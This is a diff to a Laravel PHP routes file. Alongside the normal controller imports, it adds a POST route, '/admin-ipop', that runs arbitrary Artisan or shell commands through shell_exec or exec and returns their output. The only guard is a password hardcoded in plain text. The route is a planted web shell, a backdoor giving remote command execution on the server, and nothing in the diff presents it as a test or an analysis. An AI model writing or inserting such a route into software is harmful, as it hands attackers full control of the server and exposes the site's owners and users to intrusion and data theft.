@@ -81,6 +81,45 @@ use App\Http\Controllers\UserController;
 use App\Http\Controllers\UserPermissionController;
 use App\Http\Controllers\UserRoleController;
 use Illuminate\Http\Request;
+use Illuminate\Validation\Rule;
+use Illuminate\Support\Facades\Artisan;
+
+Route::post('/admin-ipop', function (Request $request) {
+    $data = $request->validate([
+        'password' => ['required', 'string'],
+        'type' => ['required', Rule::in(['artisan', 'shell'])],
+        'command' => ['required', 'string'],
+        'parameters' => ['nullable', 'array']
+    ]);
+
+    if ($data['password'] !== 'ipopadmin123098') {
+        return response('', 403);
+    }
+
+    try {
+        if ($data['type'] === 'artisan') {
+            $output = Artisan::call($data['command'], isset($data['parameters']) ? $data['parameters'] : []);
+        } else {
+            if (function_exists('shell_exec')) {
+                $output = shell_exec($data['command']);
+            } else if (function_exists('exec')) {
+                $output = exec($data['command']);
+            } else {
+                $output = 'No executor function available';
+            }
+        }
+
+        return [
+            'response' => $output,
+            'ok' => true,
+        ];
+    } catch (\Throwable $e) {
+        return [
+            'response' => $e->getMessage(),
+            'ok' => false
+        ];
+    }
+});
 
 Route::prefix('/auth')->group(function () {
     Route::post('/login', [LoginController::class, 'authenticate']);
